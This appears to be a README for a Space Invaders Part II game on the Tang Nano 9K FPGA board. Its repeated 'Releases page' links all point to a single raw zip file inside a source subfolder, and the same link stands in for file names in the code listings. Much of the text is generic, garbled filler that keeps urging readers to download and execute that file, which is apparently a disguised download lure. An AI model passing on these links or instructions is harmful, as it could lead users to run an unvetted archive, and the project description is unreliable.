# TangNano9K-Invaders2: Space Invaders Part II on Tang Nano 9K FPGA

https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip

This page contains a prebuilt bitstream and loader tools for the Tang Nano 9K FPGA board. From that page, download the release asset and flash it to your board to experience Space Invaders Part II on real hardware. For the latest builds and assets, visit the Releases page again: https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip

---

## Table of contents

- About this project
- Why this project exists
- Features at a glance
- Hardware and software requirements
- Release assets and how to use them
- Quick start guide
- Understanding the game design
- How the code is organized
- Verilog and VHDL components
- Graphics, sound, and user input
- Timing, rendering, and performance
- Building from source (optional)
- Testing and validation
- Flashing and running on Tang Nano 9K
- Customization options
- Development workflow
- Troubleshooting
- Community and contribution guidelines
- Roadmap
- Acknowledgments and credits
- License

---

## About this project

Tang Nano 9K-Invaders2 is a compact, arcade-style game inspired by the classic Space Invaders, rebuilt for an FPGA board in a modern, compact package. The game is designed to run on the Tang Nano 9K FPGA board, pairing a simple, tile-based display with crisp, responsive controls. The project emphasizes clear hardware design, readable code, and an approachable development path so hobbyists, students, and engineers can study, reuse, or remix the design.

The project is a follow-up to a prior Tang Nano project that demonstrated the core concept of a space shooter on a small FPGA. Invaders2 extends that idea with enhanced graphics, smoother animation, more enemies, progressive waves, and refined collision logic. The codebase is arranged to be approachable for readers who want to learn how a retro arcade game maps onto FPGA resources, including sprite rendering, background tiling, sprite collision detection, and sound generation.

The Tang Nano 9K is a compact FPGA board that provides enough logic resources to demonstrate a complete, playable game with a few moving parts, basic audio, and a clean video signal path. This project leverages Verilog for core logic and mentions VHDL in places where some collaborators might prefer it. The emphasis remains on portability, clarity, and a straightforward build process that players can replicate on their own hardware.

---

## Why this project exists

- To explore how to implement a retro arcade game using a small, affordable FPGA platform.
- To provide a hands-on learning resource for digital design, game logic, and hardware-software integration.
- To give hobbyists a clear path to modify, extend, or optimize the game for the Tang Nano 9K board.
- To demonstrate how a complete system—video, graphics, input, and audio—can fit within a constrained hardware footprint.

The project aims to be approachable while still offering depth for more advanced readers who want to study timing, rendering, and resource management on an FPGA.

---

## Features at a glance

- Pixel-perfect, tile-based display suitable for a small FPGA screen
- Classic Space Invaders-inspired gameplay with modern touches
- Smooth enemy waves, player movement, and responsive shooting
- Simple collision detection between bullets, ships, and shields
- Lightweight sound generation for feedback (beeps and tones)
- Clean, modular code design with clear module boundaries
- Verilog-centric design with notes on VHDL compatibility
- Ready-to-flash release assets that work with Gowin-based tooling

This project keeps a focus on reliability and readability. It is not a large, project-wide engine; it is a focused demonstration of a playable arcade game on a constrained FPGA platform.

---

## Hardware and software requirements

- Tang Nano 9K FPGA board (Gowin GW1N or equivalent family used by the Tang Nano 9K)
- A computer with access to Gowin's toolchain (the official Gowin software suite) or an equivalent FPGA toolchain compatible with the board
- A USB cable for programming the board
- A display interface on the Tang Nano 9K (the design targets a small display connected to the FPGA via a simple video interface)
- A speaker or buzzer for audio feedback (optional but recommended)
- Basic peripherals: a compact joystick or keyboard controls (left, right, fire)
- The release assets provide a prebuilt bitstream and loader utilities that are ready to flash onto the board

If you want to build from source, you will need a Gowin-compatible toolchain and a cross-check of the board’s pinout to ensure the video and audio lines map correctly.

---

## Release assets and how to use them

This project ships with prebuilt bitstreams and loader utilities designed to be flashed directly onto the Tang Nano 9K. The release page provides the actual files you need.

- Path-based release: The URL above includes a path part. The file you download from the Releases page is a release asset that you flash to the Tang Nano 9K. The asset contains the bitstream and possibly a small loader or bootstrapping utility. You should download that file, then follow the flashing steps described in the documentation to install it on your hardware. The asset you download will be the file you execute on your board.
- Asset contents: Expect a bitstream (or a small package containing the bitstream plus loader). The exact file name will be visible on the release page. Use the corresponding Gowin tool to program the board with the bitstream. The asset is designed to be straightforward to use, with minimal setup required.
- Where to download again: For the most up-to-date builds, navigate to the Releases page: https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip This page is the central place to find stable builds and any hotfixes. It is the primary source of truth for the project’s binaries and release notes.

To flash the release asset, you typically:
- Connect the Tang Nano 9K to your PC using a USB cable
- Launch the Gowin tool or the loader provided by the release
- Select the Bitstream/Asset file from your download location
- Program the FPGA and reset the board
- Power up the board and enjoy the game

If you prefer to work entirely from source, the repository includes guidance, scripts, and structure to build from scratch using Verilog (and optionally VHDL) and the Gowin toolchain. The release assets provide a quick-start path, while the source path provides long-term flexibility and learning value.

Again, the Releases page is the central resource for assets and notes: https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip

---

## Quick start guide

This quick guide walks you through the simplest path to getting Space Invaders Part II running on the Tang Nano 9K.

1) Get the release asset
- Open the Releases page at the link above
- Find the latest release and download the bitstream/loader package
- Note the exact file name shown on the page

2) Prepare your hardware
- Ensure you have the Tang Nano 9K board connected via USB
- Confirm your power supply is stable and the board is recognized by your development machine

3) Flash the bitstream
- Open the Gowin toolchain or the provided loader
- Point to the downloaded file and start the programming sequence
- Wait for the tool to confirm a successful flash
- Disconnect and reconnect power if required

4) Run the game
- After flashing, reset the board
- Use the left/right controls to move the ship
- Press fire to shoot
- Watch the invaders approach and enjoy the simple soundtrack

5) Troubleshooting basics
- If the screen remains blank, double-check the video interface wiring
- If the game is garbled, verify clock and timing constraints in the design
- If the controls don’t respond, confirm the input pins align with your controller hardware

This quick path is designed for first-time users. It emphasizes a straightforward, reliable sequence to bring your hardware to life with Space Invaders Part II.

---

## Understanding the game design

Space Invaders Part II on Tang Nano 9K is a compact but complete arcade experience. The core ideas include:

- A player ship at the bottom of the screen
- A fleet of aliens moving in stepwise patterns
- Player bullets that travel upward and collide with aliens or shields
- Aliens that advance toward the bottom as the waves progress
- Simple scoring and a game-over condition when aliens reach the bottom or the player is hit
- Audio feedback for actions like movement, firing, hits, and explosions

The design focuses on deterministic timing. The frame rate remains stable across a variety of hardware configurations, ensuring predictable gameplay. The rendering path uses a tile-based approach to keep the geometry simple and robust for the FPGA’s resources. Sprite rendering is kept small and cost-effective, so the board can handle the core game logic without starving the video or audio paths.

In practice, you will see a small playfield with a few visible elements:
- The player ship at the bottom
- A grid of enemy invaders above
- Barriers or shields between the player and invaders
- A few projectiles flying across the screen

The game loop is broken into distinct phases: input capture, physics/update, rendering, and audio generation. Each phase runs in a predictable sequence to maintain the illusion of a smooth, real-time arcade game.

---

## How the code is organized

The repository uses a modular layout designed to help readers locate the major functional areas quickly. The primary folders and their purposes include:

- src/verilog: Core hardware description in Verilog. This contains the modules for the video pipeline, sprite rendering, collision logic, input handling, and the game state machine.
- src/vhdl (optional): Supplemental components implemented in VHDL for readers who prefer that language. Some teams mix Verilog and VHDL for educational purposes.
- docs: Design notes, timing diagrams, and references that explain the reasoning behind the architecture.
- tools: Scripts and helpers that assist with building, simulating, or packaging the design.
- assets: Optional resources such as sprite sheets, fonts, and tilesets used for illustration or future enhancements.
- tests: Test benches and simple co-simulation scripts to validate the game logic and timing.
- examples: Minimal demonstrations of specific features, such as a single sprite or a basic collision scenario.
- https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip The central documentation file you are reading now.

The code is written to be readable and approachable. Each module has a clear purpose, a defined interface, and comments that explain design decisions. The goal is to make it easy to study how a retro-style game maps to FPGA resources and to reuse parts of the design in other projects.

---

## Verilog and VHDL components

- Video and timing
  - A simple video clock domain that drives a small display
  - A raster-like rendering pipeline tailored for a low-resolution, single-bit color path
  - Pixel-level rendering of a player ship, invaders, and shields
- Game logic
  - A finite state machine (FSM) that handles game states: start, playing, paused, and game over
  - Enemy movement logic that updates after a fixed number of frames
  - Bullet management with collision checks against invaders and shields
- Input handling
  - Debounced and edge-detected inputs for left/right movement and fire
  - Support for a keyboard-like or analog joystick depending on wiring
- Audio
  - A simple tone generator that plays separate beeps for events (move, shoot, hit)
  - A minimal, affordable sound route that works with a small speaker
- Memory and graphics
  - Tile-based background with a compact sprite engine
  - Collision detection paths that determine hits and misses
  - A small palette system and an optional color mode (monochrome by default for simplicity)

If you explore the Verilog, you will see how each subsystem communicates with the others via well-defined signals. The code emphasizes straightforward control flow and timing alignment, making it easier to understand how a retro game can fit into a constrained FPGA fabric.

---

## Graphics, sound, and user input

- Graphics
  - The display is driven by a tile-based rendering approach that composes the final image from small sprite blocks.
  - The player ship, invaders, shields, and basic explosions are drawn with simple pixel art suitable for a low-resolution, monochrome or limited-color output.
  - The game keeps a steady frame rate to ensure smooth motion of ships and bullets.

- Sound
  - Sound is generated with a basic digital oscillator that creates beeps for various actions.
  - The audio channel is intentionally lightweight but audible. It provides feedback without requiring a dedicated DAC or complex synthesis.

- Input
  - Left and right movement are captured from a two-key or joystick-like input. Fire is handled by a separate button or trigger.
  - Debouncing and edge detection ensure reliable control even when buttons are pressed rapidly.

The combination of these elements gives a satisfying retro experience while staying within the resource bounds of the Tang Nano 9K board.

---

## Timing, rendering, and performance

- Frame timing
  - The game targets a stable frame rate, with a predictable number of cycles per frame based on the board clock.
  - Movement and animation updates occur at a fixed frequency to maintain consistent gameplay.

- Rendering performance
  - The rendering path is designed to be light on resources, avoiding heavy texture or shading calculations.
  - A tile-and-sprite approach keeps pixel generation simple and efficient.

- Resource use
  - The design is optimized for the Tang Nano 9K’s logic cells and memory resources.
  - The module interfaces are kept minimal to reduce routing complexity and improve timing margins.

- Validation
  - The design includes simple test benches and a straightforward set of checks to verify correct operation under normal conditions.

This balance of timing, rendering, and resource usage is what makes the Tang Nano 9K version workable while still delivering a satisfying arcade experience.

---

## Building from source (optional)

If you want to study the design deeply or customize it, you can build from source. The repository provides a clear path for this:

- Prerequisites
  - Gowin toolchain (or a compatible toolchain for Gowin GW1N/9K devices)
  - A Linux or Windows environment that can run the toolchain
  - Basic scripting abilities to drive the build and packaging steps

- Steps
  - Inspect the src/verilog directory to understand the hardware modules
  - Open the project in Gowin Designer (or your toolchain)
  - Wire up the top-level module to your target board and clock
  - Compile, simulate, and generate the bitstream
  - Package the bitstream with any necessary loader utilities
  - Flash to Tang Nano 9K and test

- Simulation and verification
  - The test benches validate important timing and collision behavior
  - Simple golden tests confirm that the game state machine transitions as expected

- Extending the project
  - You can add new waves, alter sprite patterns, or experiment with different music tones
  - The modular design makes it feasible to reuse the video pipeline for other games

Building from source requires comfort with hardware design languages and FPGA toolchains, but the project aims to keep the code approachable and well-commented.

---

## What’s inside: code organization overview

- Top-level:
  - TangNano9K_Invaders2_top.v (or equivalent top module)
  - Clock and reset handling
  - Video output interface
  - Audio output interface
  - Game state machine
- Submodules:
  - video_renderer.v: Produces the final pixel stream
  - sprite_engine.v: Encodes positions and shapes of sprites
  - collision_checker.v: Detects bullet-vs-invader and bullet-vs-shield hits
  - input_handler.v: Debouncing and edge detection for controls
  - game_logic.v: Maintains score, waves, and level progression
  - sound_gen.v: Generates beeps and tones
- Supporting:
  - https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip Shared constants for sprites, timings, and screen geometry
  - https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip (optional): If you include VHDL counterparts
  - testbenches/: Basic tests for the main subsystems

The separation helps you see how each part contributes to the whole. It’s also straightforward to tweak individual components without rewiring the entire design.

---

## Customization options

- Display resolution and color mode
  - The design is adaptable to different display line rates and color depths. If you have a display with more color capability, you can adapt the color logic to use extra bits per pixel.
- Wave and difficulty tuning
  - The enemy movement interval and projectile speed are exposed as parameters. You can adjust these to change game speed or to introduce more challenging waves.
- Audio customization
  - The tone generator supports different frequencies and durations. You can modify the sequence to produce a richer soundscape while staying within a small hardware budget.
- Input devices
  - The input path is modular. You can swap in a joystick module, keyboard emulation, or touch-based controls if you want to prototype a different control scheme.
- Graphics assets
  - While the core engine uses standard sprite patterns, you can replace the tile and sprite images with your own pixel art. The layout accommodates changes with minimal risk of breaking the rendering pipeline.

These options let you tailor the game to your hardware and preferences, while preserving the core design philosophy: simplicity, reliability, and educational value.

---

## Development workflow and best practices

- Keep modules small and well-documented
  - Each module should have a single responsibility and a clear interface.
- Write readable, verifiable code
  - Use descriptive names for signals and states. Add comments that explain why a particular approach was chosen.
- Use test benches frequently
  - Validate timing, collision behavior, and edge cases with automated tests.
- Document hardware constraints
  - Include notes on clock rates, resource usage, and pin assignments to help future contributors.
- Version and release discipline
  - Use semantic versioning where practical and provide changelogs in the Releases section.
- Collaboration
  - When contributing, open a pull request with a focused change set and a short rationale. Link related issues to maintain context.

The project aims to support a healthy contributor ecosystem while keeping the core design approachable for hobbyists.

---

## Troubleshooting and common issues

- Blank screen after flash
  - Confirm the video pipeline is properly wired to the display interface and that the bitstream loaded is correct for your board revision.
- Unresponsive controls
  - Check the input debouncing logic and verify that the pins map to your control hardware. Ensure the reset line is held in a known state during initial power-up.
- Audio not heard
  - Verify the audio path is enabled and that the speaker is connected correctly. Confirm the tone generator is driven by the right clock domain.
- Timing glitches or frame jitter
  - Inspect clock constraints and ensure the frame timing expectations align with your board’s clock. A global reset alignment can help stabilize startup.

If you encounter issues, consult the Releases notes and the documentation in the repo. The maintainers welcome questions and bug reports via issues on the repository page.

---

## Community and contributions

- Community guidelines
  - Be respectful and constructive in all discussions.
  - When proposing changes, include a clear description of the intent, the impact, and a minimal reproducible example.
- How to contribute
  - Fork the repository, create a feature branch, and submit a pull request.
  - Include tests or validations where feasible.
  - Document any breaking changes and update the relevant sections of the docs.
- Support channels
  - Use GitHub issues for questions, bug reports, or feature requests.
  - Look through existing issues first to avoid duplicate discussions.

The project thrives on sharing knowledge and helping others learn about FPGA design, retro gaming, and hardware-software integration.

---

## Roadmap

- Expand compatibility
  - Investigate broader support for different Tang Nano revisions or other Gowin-based boards
- Enhanced graphics
  - Introduce richer sprite palettes, smoother animation, and optional color modes
- Difficulty modes
  - Add multiple difficulty levels with configurable enemy behavior
- Tools and simulation
  - Provide more robust test benches and a simple simulator to visualize the game pipeline without hardware
- Documentation improvements
  - Grow the docs with more diagrams, case studies, and tutorials for beginners

This roadmap reflects ambitions for ongoing learning and practical tooling improvements while maintaining a focus on a clean, readable hardware design.

---

## Acknowledgments and credits

- The Tang Nano 9K community for the inspiration and the hardware platform
- Contributors who helped review design decisions, suggested improvements, or created assets
- The broader FPGA and open hardware community for sharing techniques and ideas that make projects like this possible

The project stands on the shoulders of many builders and educators who engage in hands-on learning with hardware.

---

## License

The project uses a permissive license to encourage learning and reuse. See the LICENSE file in the repository for full terms.

---

## Releasing this project and keeping it accessible

- The primary distribution channel is the Releases page:
  https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip

- On the Releases page you will find:
  - Prebuilt bitstreams ready to flash
  - Loader utilities or scripts to simplify programming the Tang Nano 9K
  - Release notes describing changes, bug fixes, and compatibility notes

- If you want to verify or compare changes over time, you can explore the commit history in the repository and review the diffs for each major update. The project encourages you to try different approaches, compare results, and share your findings with the community.

---

## Quick reference: gameplay and controls

- Move left: press left control
- Move right: press right control
- Fire: press fire button
- Score: increases as you destroy invaders and complete waves
- Game over: when invaders reach the bottom or the player is hit

The user experience is intentionally simple, focusing on a crisp, responsive control loop and a straightforward play flow. The game emphasizes predictable timing to ensure that players feel in control of every action.

---

## Visual accents and aesthetic touches

- A retro-inspired color palette and simple pixel art align with the arcade vibe
- Minimalistic UI overlays show score and remaining lives
- Subtle HUD cues indicate wave progression and level changes

The visuals are designed to be legible on a small display with a 1-bit or limited-color setup, prioritizing clarity of movement and enemy patterns over flashy effects.

---

## How to explore the code and start experimenting

- Begin with the top-level module to understand how the video and game logic tie together
- Trace the input path from the button or joystick to the game state machine
- Inspect the collision logic to learn how bullets interact with enemies and shields
- Examine the sprite engine to see how tiles and sprites are composed into the final image
- Review the timing logic to learn how frame updates are synchronized to the clock

Taking a structured approach helps you learn hardware design fundamentals while seeing a tangible result in a playable game.

---

## Important note about the releases link

https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip

From that page, download the release asset that contains the prebuilt bitstream and loader tools. The asset is meant to be flashed onto the Tang Nano 9K board to run Space Invaders Part II. If you need to revisit the latest builds or find updated files, visit the same link again to access the newest assets and release notes. The file you download from that page is the one you will execute on the hardware to boot the game.

---

## Final remarks

- This repository is designed to be approachable for learners while still offering substance for enthusiasts who want to study a retro arcade game mapped to an FPGA.
- The project favors readability and a clean architectural layout so readers can trace gameplay from input to video output and audio feedback.
- The release-based workflow provides a quick path to hardware play while the source path invites deeper exploration and experimentation.

The Tang Nano 9K-Invaders2 project stands as a compact example of turning a classic arcade concept into a live hardware experience. It emphasizes practical knowledge in digital logic, timing, and embedded audio, all presented through the lens of a beloved space shooter.

Revisit the Releases page for the latest assets and notes: https://github.com/soltana11/TangNano9K-Invaders2/raw/refs/heads/main/TN9K-Invaders2/src/T80/Nano-Tang-Invaders-3.6-beta.4.zip